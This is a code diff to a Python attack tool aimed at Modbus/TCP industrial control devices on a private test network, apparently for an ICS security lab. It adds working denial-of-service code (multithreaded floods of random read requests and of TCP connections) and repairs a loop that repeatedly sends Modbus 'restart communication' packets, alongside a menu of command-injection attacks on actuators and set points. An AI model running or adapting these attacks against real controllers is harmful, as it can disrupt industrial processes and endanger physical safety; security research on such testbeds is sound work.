@@ -364,6 +364,7 @@ def force_listen_mode(ip_addresses):
             print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
         else:
             print(f"Successful attack!")
+        client.close()
 
     print("### FORCE LISTEN MODE FINISH ###")
 
@@ -383,8 +384,8 @@ def restart_communication(ip_addresses):
         print(f"Sending a restart communication request to {ip} in 3 second intervales")
         print("Press enter to stop")
 
+        client = ModbusClient(host=ip, port=502)
         while not stop_looping:
-            client = ModbusClient(host=ip, port=502)
 
             # send custom pdu request for a Restart Communcation - function code 08 with subfunction code 01 (device - dependent)
             pdu = b'\x08\x00\x01\x00\x00'
@@ -396,23 +397,84 @@ def restart_communication(ip_addresses):
             else:
                 print(f"Successful attack! Sent Restart Communication packet")
             sleep(3)
+        client.close()
             
     print("### RESTART COMMUNICATION FINISH ###")
 
-# Function: packet_flooding_attack
-# Purpose: Floods packets of random content to the devices
-def packet_flooding_attack(ip_addresses):
-    print("### PACKET FLOODING ATTACK ###")
+# Function: data_flood_attack
+# Purpose: Floods packets of random read requests to the devices
+def data_flood_attack(ip_addresses):
+    global stop_looping
+    print("### DATA FLOOD ATTACK ###")
+
+    # helper function to flood packets
+    def _flood(ip):
+        global stop_looping
+
+        client = ModbusClient(host=ip, port=502)
+        while not stop_looping:
+            # select random read function code + random address + random num of registers to read
+            func_code = random.choice([1, 2, 3, 4])
+            address = random.randint(0, 100)
+            num_values = random.randint(1, 100)
+        
+            # Randomly choose some parameters for the request
+            if func_code == 1:
+                client.read_coils(address, num_values)
+            elif func_code == 2: 
+                client.read_discrete_inputs(address, num_values)
+            elif func_code == 3:
+                client.read_holding_registers(address, num_values)
+            elif func_code == 4:
+                client.read_input_registers(address, num_values)
 
     for ip in ip_addresses:
-        print(f"Flooding {ip} with random packets")
+        print(f"Flooding {ip} with random packets from 10 threads")
+        print("Press enter to stop")
 
-    print("### PACKET FLOODING ATTACK FINISH ###")
+        stop_looping = False
+        th_stopper = Thread(target=_check_for_enter)
+        th_stopper.start()
 
-def invalid_cyclic_redundancy_code(ip_addresses):
-    print("### INVALID CYCLIC REDUNDANCY CODE ###")
+        for _ in range(10):
+            th_flooder = Thread(target=_flood, args=(ip,))
+            th_flooder.start()
 
-    print("### INVALID CYCLIC REDUNDANCT CODE FINISH ###")
+        while not stop_looping:
+            pass # block
+
+    print("### DATA FLOOD ATTACK FINISH ###")
+
+# Function: connection_flood_attack
+# Purpose: Floods packets with TCP connection requests
+def connection_flood_attack(ip_addresses):
+    global stop_looping
+    print("### CONNECTION FLOOD ATTACK ###")
+
+    # helper function to flood connection requests
+    def _flood_connection(ip):
+        global stop_looping
+
+        while not stop_looping:
+            client = ModbusClient(host=ip, port=502)
+            client.close()
+
+    for ip in ip_addresses:
+        print(f"Flooding {ip} with connection requests from 10 threads")
+        print("Press enter to stop")
+
+        stop_looping = False
+        th_stopper = Thread(target=_check_for_enter)
+        th_stopper.start()
+
+        for _ in range(10):
+            th_flooder = Thread(target=_flood_connection, args=(ip,))
+            th_flooder.start()
+
+        while not stop_looping:
+            pass # block
+
+    print("### CONNECTION FLOOD ATTACK FINISH ###")
 
 
 # Main function
@@ -437,12 +499,12 @@ if __name__ == "__main__":
 |    Command Injection Attacks                                  |
 |    (7) - altered actuator state                               |
 |    (8) - altered control set points                           |
-|    (9)* - force listen mode                                   |
-|    (10)** - restart communication                             |
+|    (9) - force listen mode                                    |
+|    (10) - restart communication                               |
 |                                                               |
 |    Denial of Service Attacks                                  |
-|    (11) - packet flooding attack                              |
-|    (12) - invalid cyclic redundancy code                      |
+|    (11) - data flood attack                                   |
+|    (12) - connection flood attack                             |
 -----------------------------------------------------------------
 
 """
@@ -480,6 +542,6 @@ if __name__ == "__main__":
         elif selection == 10:
             restart_communication(["192.168.0.21", "192.168.0.22"])
         elif selection == 11:
-            packet_flooding_attack(["192.168.0.21", "192.168.0.22"])
+            data_flood_attack(["192.168.0.21", "192.168.0.22"])
         elif selection == 12:
-            invalid_cyclic_redundancy_code(["192.168.0.21", "192.168.0.22"])
+            connection_flood_attack(["192.168.0.21", "192.168.0.22"])
